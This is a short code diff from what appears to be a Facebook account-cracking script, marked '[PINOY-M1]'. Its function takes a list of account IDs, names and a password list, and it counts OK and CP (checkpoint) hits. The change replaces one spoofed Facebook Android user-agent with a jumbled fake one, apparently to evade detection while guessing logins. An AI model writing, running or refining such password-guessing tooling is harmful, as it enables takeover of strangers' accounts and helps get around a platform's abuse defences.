@@ -253,7 +253,7 @@ def graph(ids,names,passlist):
     global loop,oks,cps
     sys.stdout.write(f'\r\r [PINOY-M1]\033[1;36m [%s]\033[0;37m :::\033[1;32m OK \033[0;37m>>\033[1;32m %s '%(loop,len(cps)));sys.stdout.flush()
     sys.stdout.flush()
-    ua = 'Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/454.0.0.37.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/588686349;FBCR/Robi;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]'
+    ua = 'Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39) [FBAN/;FBAV/A1XDL5U4;FBBV/263841039;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/263841039;FBDM//*{density=2.0,width=2560,height=3840};FBLC/fr_FR;FBRV/590788881;FBCR/Realme;FBMF/Xiaomi;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Mi_11T_Pro;FBSV/11;FBOP/8;FBCA/arm64-v8a;FBSS/;]'
     try:
         fn = names.split(' ')[0]
         try:
